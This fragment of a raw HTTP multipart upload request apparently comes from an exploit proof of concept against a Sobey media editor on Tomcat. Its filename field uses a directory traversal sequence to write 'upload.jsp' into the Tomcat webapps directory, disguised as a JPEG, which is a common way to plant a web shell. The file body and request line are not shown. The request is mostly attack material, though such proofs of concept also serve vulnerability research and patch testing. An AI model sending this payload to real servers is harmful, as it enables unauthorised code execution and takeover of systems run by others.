    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Sec-Fetch-Site: none

    Sec-Fetch-Mode: navigate

    Sec-Fetch-User: ?1

    Sec-Fetch-Dest: document

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary89I920XG9PT7qiwi

    Accept: */*

    Connection: close


    ------WebKitFormBoundary89I920XG9PT7qiwi

    Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/upload.jsp"

    Content-Type: image/jpeg


